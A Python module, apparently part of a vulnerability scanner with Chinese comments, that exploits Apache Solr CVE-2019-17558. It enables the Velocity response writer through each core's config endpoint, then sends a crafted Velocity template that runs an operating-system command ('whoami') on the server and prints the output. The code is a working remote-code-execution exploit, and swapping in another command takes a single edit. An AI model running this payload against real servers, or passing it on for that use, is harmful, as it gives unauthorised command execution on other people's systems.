from termcolor import cprint
import requests
import threading
import re
import json
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


# 模板
class Detect(threading.Thread):
    name = 'Solr'

    def __init__(self, url, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.url = url.rstrip('/')
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True

    # 调用各种漏洞检测方法
    def run_detect(self):
        # 漏洞1
        self.CVE_2019_17558()

        if not self.isExist:
            return False
        else:
            return True

    # 漏洞1
    def CVE_2019_17558(self):
        url1 = self.url + '/solr/admin/cores?indexInfo=false&wt=json'
        # tqdm.write(Fore.WHITE + 'test upload : {}'.format(url1))
        try:
            res = requests.get(url=url1, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and 'responseHeader' in res.text:
                json_data = json.loads(res.text)
                if json_data['status']:
                    for name in json_data['status']:
                        config_url = self.url + '/solr/' + name + '/config'

                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                            'Accept-Encoding': 'gzip, deflate',
                            'Content-Type': 'application/json',
                            'Content-Length': '259',
                            'Connection': 'close'
                        }
                        payloads = """
                                    {
                                        "update-queryresponsewriter": {
                                            "startup": "lazy",
                                            "name": "velocity",
                                            "class": "solr.VelocityResponseWriter",
                                            "template.base.dir": "",
                                            "solr.resource.loader.enabled": "true",
                                            "params.resource.loader.enabled": "true"
                                        }
                                    }
                                """

                        res2 = requests.post(url=config_url, headers=headers, data=payloads, proxies=self.proxies, verify=False)
                        res3 = requests.get(url=config_url, headers=self.headers, proxies=self.proxies, verify=False)
                        if (res2.status_code == 200 or 'responseHeader' in res2.text) and '"params.resource.loader.enabled":"true"' in res3.text:
                            command_payload = r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format("whoami")
                            res = requests.get(self.url + "/solr/" + name + command_payload)
                            tqdm.write(Fore.RED + '[Solr CVE-2019-17558] {} User:{}'.format(self.url, res.text.strip()))
                            self.vul_list.append(['Solr CVE-2019-17558', self.url, 'Yes User: {}'.format(res.text.strip())])
                            self.isExist = True
                            break
                else:
                    self.isExist = False
        except Exception as e:
            return False

if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))













